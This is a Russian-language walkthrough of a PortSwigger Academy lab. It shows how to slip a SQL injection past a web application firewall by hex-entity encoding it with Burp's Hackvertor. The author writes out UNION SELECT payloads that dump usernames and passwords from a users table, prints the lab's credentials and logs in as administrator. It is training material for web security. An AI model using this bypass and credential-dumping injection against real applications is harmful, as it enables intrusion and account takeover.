откроем приложение

откроем рандомный товар, и узнаем его количество товара нажав `check stock` и увидим, что на складе осталось `823 единицы товара`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/14.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/pics%20for%20walktrough/1.png)
Далее в `Proxy` -> `HTTP history` данный запрос
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/14.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/pics%20for%20walktrough/2.png)
На следующем шаге внедрим SQL-инъекцию в тэг `StoreId`
```
1 UNION SELECT NULL
```
И увидим сообщение, что наш запрос был заблокирован Web Application Firewall'ом
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/14.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/pics%20for%20walktrough/3.png)
Для обхода Web Application Firewall воспользуемся расширением Burp Suite.

Перейдем в `Extensions` -> `BApp store` -> `Hackvertor` и установим его
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/14.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/pics%20for%20walktrough/4.png)
Далее выделим наш пэйлоад `1 UNION SELECT NULL` и выберем `ПКМ` -> `Extensions` -> `Hackvertor` -> `Encode` -> `hex_entities`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/14.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/pics%20for%20walktrough/5.png)
И увидим, что появился дополнительный тэг внутри нашего запрос
```
<@hex_entities>1 UNION SELECT NULL<@/hex_entities>
```
И так же удостоверимся, что SQL-инъекция стала возможна
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/14.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/pics%20for%20walktrough/6.png)
Далее модифицируем наш SQL-запрос, чтобы он показывал нам связку `username`, `password` из таблицы `users`
```
<@hex_entities>1 UNION SELECT username || '~' || password FROM users <@/hex_entities>
```

и в ответ получим
```
administrator~ummb2w30412kbt1bqrvr
wiener~eehvuk49l5j4l0r9ri72
carlos~vp44y1xh8a95g6r06whr
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/14.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/pics%20for%20walktrough/7.png)
На финальном этапе залогинимся с кредами `administrator:ummb2w30412kbt1bqrvr` и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/14.%20SQL%20injection%20with%20filter%20bypass%20via%20XML%20encoding/pics%20for%20walktrough/8.png)
